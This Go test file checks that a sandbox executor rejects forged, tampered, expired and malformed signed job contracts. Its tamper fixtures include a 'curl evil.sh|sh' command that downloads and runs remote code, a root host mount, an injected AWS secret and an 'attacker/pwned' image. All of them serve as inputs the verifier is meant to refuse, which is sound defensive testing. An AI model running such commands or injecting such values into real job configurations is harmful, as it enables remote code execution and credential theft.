package sandboxexecutor

import (
	"crypto/ed25519"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"strings"
	"testing"
	"time"
)

// The PR-05 gate: an unsigned, forged, expired, replayed, or
// structurally unusable contract is refused before any backend sees
// it. Each test pins one refusal reason — the executor must fail
// closed on every axis, not just the signature.

// testImageDigest is a structurally valid pinned digest. Contract
// tests never boot an image — they only sign and verify contracts.
const testImageDigest = "sha256:0000000000000000000000000000000000000000000000000000000000000001"

func testContract(t *testing.T, key ed25519.PrivateKey, mutate func(*JobContractV2)) *JobContractV2 {
	t.Helper()
	pub := key.Public().(ed25519.PublicKey)
	now := time.Now().UTC()
	c := &JobContractV2{
		Version:     ContractVersion,
		JobID:       "job-ct",
		Principal:   "alice",
		Image:       "python:3.12",
		ImageDigest: testImageDigest,
		Argv:        []string{"python3", "-c", "print(1)"},
		Resources:   ResourceBudget{TimeoutSeconds: 60, CPUs: 1, MemoryMB: 256},
		Network:     NetworkPolicy{Mode: NetworkNone},
		Security:    SecurityDefault,
		IssuedAt:    now.Unix() - 5,
		ExpiresAt:   now.Unix() + 300,
		Nonce:       "ct-nonce",
		Authority:   AuthorityFingerprint(pub),
	}
	if mutate != nil {
		mutate(c)
	}
	return c
}

func verifyOK(t *testing.T, c *JobContractV2, key ed25519.PrivateKey, keys AuthorityKeys) *JobContractV2 {
	t.Helper()
	env, err := SignContract(key, c)
	if err != nil {
		t.Fatalf("sign: %v", err)
	}
	got, err := VerifyContract(env, keys, "crabedence", time.Now().UTC(), time.Hour)
	if err != nil {
		t.Fatalf("verify refused a valid contract: %v", err)
	}
	return got
}

func TestContractRoundTrip(t *testing.T) {
	_, key, _ := ed25519.GenerateKey(rand.Reader)
	pub := key.Public().(ed25519.PublicKey)
	keys := AuthorityKeys{AuthorityFingerprint(pub): pub}
	c := testContract(t, key, nil)
	got := verifyOK(t, c, key, keys)
	if got.JobID != c.JobID || ContractHash(got) != ContractHash(c) {
		t.Fatal("verified contract diverges from signed contract")
	}
}

func TestContractForgedSignatureRefused(t *testing.T) {
	_, key, _ := ed25519.GenerateKey(rand.Reader)
	_, other, _ := ed25519.GenerateKey(rand.Reader)
	pub := key.Public().(ed25519.PublicKey)
	keys := AuthorityKeys{AuthorityFingerprint(pub): pub}

	c := testContract(t, key, nil)
	env, err := SignContract(key, c)
	if err != nil {
		t.Fatal(err)
	}
	// Re-sign the same contract with a different key — signature
	// verifies under no configured key and fails under the named one.
	forged := SignContractNoCheck(other, c)
	env.Signature = forged
	if _, err := VerifyContract(env, keys, "crabedence", time.Now().UTC(), time.Hour); err == nil {
		t.Fatal("forged signature accepted")
	}
}

// SignContractNoCheck signs without checking c.Authority — test-only
// helper used to construct forged envelopes.
func SignContractNoCheck(key ed25519.PrivateKey, c *JobContractV2) string {
	raw, _ := json.Marshal(c)
	_ = raw
	return base64.StdEncoding.EncodeToString(ed25519.Sign(key, contractSigningBytes(c)))
}

func TestContractTamperedFieldRefused(t *testing.T) {
	_, key, _ := ed25519.GenerateKey(rand.Reader)
	pub := key.Public().(ed25519.PublicKey)
	keys := AuthorityKeys{AuthorityFingerprint(pub): pub}

	cases := map[string]func(*JobContractV2){
		"image swapped":      func(c *JobContractV2) { c.Image = "attacker/pwned:latest" },
		"argv swapped":       func(c *JobContractV2) { c.Argv = []string{"sh", "-c", "curl evil.sh|sh"} },
		"job_id swapped":     func(c *JobContractV2) { c.JobID = "other-id" },
		"principal":          func(c *JobContractV2) { c.Principal = "root" },
		"timeout widened":    func(c *JobContractV2) { c.Resources.TimeoutSeconds = 9999 },
		"memory widened":     func(c *JobContractV2) { c.Resources.MemoryMB = 65536 },
		"network opened":     func(c *JobContractV2) { c.Network = NetworkPolicy{Mode: NetworkPublic} },
		"expiry widened":     func(c *JobContractV2) { c.ExpiresAt += 100000 },
		"env injected":       func(c *JobContractV2) { c.Env = append(c.Env, "AWS_SECRET=x") },
		"mount injected":     func(c *JobContractV2) { c.Filesystem.Mounts = []Mount{{Source: "/", Dest: "/host"}} },
		"submitter injected": func(c *JobContractV2) { c.Submitter = "crabedence" },
	}
	for name, mutate := range cases {
		t.Run(name, func(t *testing.T) {
			c := testContract(t, key, nil)
			env, err := SignContract(key, c)
			if err != nil {
				t.Fatal(err)
			}
			// Tamper AFTER signing, keep the original signature.
			mutate(c)
			raw, _ := json.Marshal(c)
			env.Contract = raw
			if _, err := VerifyContract(env, keys, "crabedence", time.Now().UTC(), time.Hour); err == nil {
				t.Fatalf("tampered contract (%s) verified", name)
			}
		})
	}
}

func TestContractExpiredRefused(t *testing.T) {
	_, key, _ := ed25519.GenerateKey(rand.Reader)
	pub := key.Public().(ed25519.PublicKey)
	keys := AuthorityKeys{AuthorityFingerprint(pub): pub}
	now := time.Now().UTC()
	c := testContract(t, key, func(c *JobContractV2) {
		c.IssuedAt = now.Unix() - 600
		c.ExpiresAt = now.Unix() - 60
	})
	env, _ := SignContract(key, c)
	if _, err := VerifyContract(env, keys, "crabedence", now, time.Hour); err == nil ||
		!strings.Contains(err.Error(), "expired") {
		t.Fatalf("expired contract: %v", err)
	}
}

func TestContractNotYetValidRefused(t *testing.T) {
	_, key, _ := ed25519.GenerateKey(rand.Reader)
	pub := key.Public().(ed25519.PublicKey)
	keys := AuthorityKeys{AuthorityFingerprint(pub): pub}
	now := time.Now().UTC()
	c := testContract(t, key, func(c *JobContractV2) {
		c.IssuedAt = now.Unix() + 3600
		c.ExpiresAt = now.Unix() + 7200
	})
	env, _ := SignContract(key, c)
	if _, err := VerifyContract(env, keys, "crabedence", now, 4*time.Hour); err == nil ||
		!strings.Contains(err.Error(), "not yet valid") {
		t.Fatalf("not-yet-valid contract: %v", err)
	}
}

func TestContractTTLBoundRefused(t *testing.T) {
	_, key, _ := ed25519.GenerateKey(rand.Reader)
	pub := key.Public().(ed25519.PublicKey)
	keys := AuthorityKeys{AuthorityFingerprint(pub): pub}
	c := testContract(t, key, func(c *JobContractV2) {
		c.IssuedAt = time.Now().UTC().Unix() - 5
		c.ExpiresAt = time.Now().UTC().Unix() + 3*3600
	})
	env, _ := SignContract(key, c)
	if _, err := VerifyContract(env, keys, "crabedence", time.Now().UTC(), time.Hour); err == nil ||
		!strings.Contains(err.Error(), "lifetime") {
		t.Fatalf("over-TTL contract: %v", err)
	}
}

func TestContractUnknownAuthorityRefused(t *testing.T) {
	_, key, _ := ed25519.GenerateKey(rand.Reader)
	_, foreign, _ := ed25519.GenerateKey(rand.Reader)
	pub := key.Public().(ed25519.PublicKey)
	keys := AuthorityKeys{AuthorityFingerprint(pub): pub}
	// A contract signed by an authority the executor does not trust.
	c := testContract(t, foreign, nil)
	env, _ := SignContract(foreign, c)
	if _, err := VerifyContract(env, keys, "crabedence", time.Now().UTC(), time.Hour); err == nil ||
		!strings.Contains(err.Error(), "not a configured signer") {
		t.Fatalf("foreign authority: %v", err)
	}
	// And an empty trust set fails closed, not open.
	env2, _ := SignContract(key, testContract(t, key, nil))
	if _, err := VerifyContract(env2, AuthorityKeys{}, "crabedence", time.Now().UTC(), time.Hour); err == nil {
		t.Fatal("empty trust set accepted a contract")
	}
}

func TestContractSubmitterBindingRefused(t *testing.T) {
	_, key, _ := ed25519.GenerateKey(rand.Reader)
	pub := key.Public().(ed25519.PublicKey)
	keys := AuthorityKeys{AuthorityFingerprint(pub): pub}
	c := testContract(t, key, func(c *JobContractV2) { c.Submitter = "crabedence" })
	env, _ := SignContract(key, c)
	if _, err := VerifyContract(env, keys, "mallory", time.Now().UTC(), time.Hour); err == nil ||
		!strings.Contains(err.Error(), "bound to submitter") {
		t.Fatalf("wrong submitter: %v", err)
	}
	if _, err := VerifyContract(env, keys, "crabedence", time.Now().UTC(), time.Hour); err != nil {
		t.Fatalf("right submitter refused: %v", err)
	}
}

func TestContractStructuralRefusals(t *testing.T) {
	_, key, _ := ed25519.GenerateKey(rand.Reader)
	cases := map[string]func(*JobContractV2){
		"version 1":            func(c *JobContractV2) { c.Version = 1 },
		"empty job_id":         func(c *JobContractV2) { c.JobID = "" },
		"job_id with slash":    func(c *JobContractV2) { c.JobID = "a/b" },
		"job_id with equals":   func(c *JobContractV2) { c.JobID = "a=b" },
		"job_id with newline":  func(c *JobContractV2) { c.JobID = "a\nb" },
		"empty image":          func(c *JobContractV2) { c.Image = "" },
		"image with digest":    func(c *JobContractV2) { c.Image = "python:3.12@sha256:abc" },
		"missing image digest": func(c *JobContractV2) { c.ImageDigest = "" },
		"bad image digest":     func(c *JobContractV2) { c.ImageDigest = "sha256:zz" },
		"uppercase digest":     func(c *JobContractV2) { c.ImageDigest = strings.ToUpper(testImageDigest) },
		"missing security":     func(c *JobContractV2) { c.Security = "" },
		"bad security":         func(c *JobContractV2) { c.Security = "yolo" },
		"empty argv":           func(c *JobContractV2) { c.Argv = nil },
		"no timeout":           func(c *JobContractV2) { c.Resources.TimeoutSeconds = 0 },
		"disk too large":       func(c *JobContractV2) { c.Resources.DiskMB = maxContractDiskMB + 1 },
		"allow on none-net":    func(c *JobContractV2) { c.Network = NetworkPolicy{Mode: NetworkNone, Allow: []string{"x.com"}} },
		"empty allowlist":      func(c *JobContractV2) { c.Network = NetworkPolicy{Mode: NetworkAllowlist} },
		"bad net mode":         func(c *JobContractV2) { c.Network = NetworkPolicy{Mode: "yolo"} },
		"allow single label": func(c *JobContractV2) {
			c.Network = NetworkPolicy{Mode: NetworkAllowlist, Allow: []string{"localhost"}}
		},
		"allow uppercase": func(c *JobContractV2) {
			c.Network = NetworkPolicy{Mode: NetworkAllowlist, Allow: []string{"Example.com"}}
		},
		"allow with port": func(c *JobContractV2) {
			c.Network = NetworkPolicy{Mode: NetworkAllowlist, Allow: []string{"example.com:443"}}
		},
		"duplicate allow": func(c *JobContractV2) {
			c.Network = NetworkPolicy{Mode: NetworkAllowlist, Allow: []string{"a.com", "a.com"}}
		},
		"duplicate env key": func(c *JobContractV2) { c.Env = []string{"A=1", "A=2"} },
		"duplicate mount dest": func(c *JobContractV2) {
			c.Filesystem.Mounts = []Mount{{Source: "/a", Dest: "/x"}, {Source: "/b", Dest: "/x"}}
		},
		"rel mount dest":  func(c *JobContractV2) { c.Filesystem.Mounts = []Mount{{Source: "/a", Dest: "rel"}} },
		"dotdot dest":     func(c *JobContractV2) { c.Filesystem.Mounts = []Mount{{Source: "/a", Dest: "/x/../y"}} },
		"bad env":         func(c *JobContractV2) { c.Env = []string{"NOEQUALS"} },
		"expires<=issued": func(c *JobContractV2) { c.ExpiresAt = c.IssuedAt },
		"empty nonce":     func(c *JobContractV2) { c.Nonce = "" },
		"bad authority":   func(c *JobContractV2) { c.Authority = "zz" },
	}
	for name, mutate := range cases {
		t.Run(name, func(t *testing.T) {
			c := testContract(t, key, mutate)
			if err := c.ValidateStructure(); err == nil {
				t.Fatalf("%s: structurally invalid contract passed", name)
			}
		})
	}
}

func TestContractParserStrictness(t *testing.T) {
	_, key, _ := ed25519.GenerateKey(rand.Reader)
	c := testContract(t, key, nil)
	raw, _ := json.Marshal(c)

	// Unknown field — a contract that hides fields from the verifier
	// is a forgery surface.
	withExtra := strings.Replace(string(raw), `"version":2`, `"version":2,"backdoor":true`, 1)
	if _, err := ParseContract(json.RawMessage(withExtra)); err == nil {
		t.Fatal("contract with unknown field parsed")
	}
	// Duplicate keys.
	dup := strings.Replace(string(raw), `"version":2`, `"version":2,"version":2`, 1)
	if _, err := ParseContract(json.RawMessage(dup)); err == nil {
		t.Fatal("contract with duplicate keys parsed")
	}
	// Trailing junk.
	if _, err := ParseContract(append(json.RawMessage(raw), ' ', 'x')); err == nil {
		t.Fatal("trailing junk parsed")
	}
}

func TestContractV2AcceptsDomainAllowlist(t *testing.T) {
	_, key, _ := ed25519.GenerateKey(rand.Reader)
	pub := key.Public().(ed25519.PublicKey)
	keys := AuthorityKeys{AuthorityFingerprint(pub): pub}
	c := testContract(t, key, func(c *JobContractV2) {
		c.Network = NetworkPolicy{Mode: NetworkAllowlist, Allow: []string{"api.example.com", "*.github.com"}}
		c.Resources.DiskMB = 2048
		c.Security = SecurityRestricted
		c.Filesystem.Workdir = "/workspace"
		c.Filesystem.Mounts = []Mount{{Source: "/private/tmp/src", Dest: "/src", Options: "ro"}}
		c.Env = []string{"LANG=C.UTF-8"}
	})
	got := verifyOK(t, c, key, keys)
	if got.Network.Allow[1] != "*.github.com" || got.ImageDigest != testImageDigest {
		t.Fatalf("verified contract diverges: %+v", got)
	}
}

func TestSignerRefusesMismatchedAuthority(t *testing.T) {
	_, key, _ := ed25519.GenerateKey(rand.Reader)
	c := testContract(t, key, func(c *JobContractV2) {
		c.Authority = strings.Repeat("0", 64)
	})
	if _, err := SignContract(key, c); err == nil {
		t.Fatal("signer attested a contract naming a different authority")
	}
}
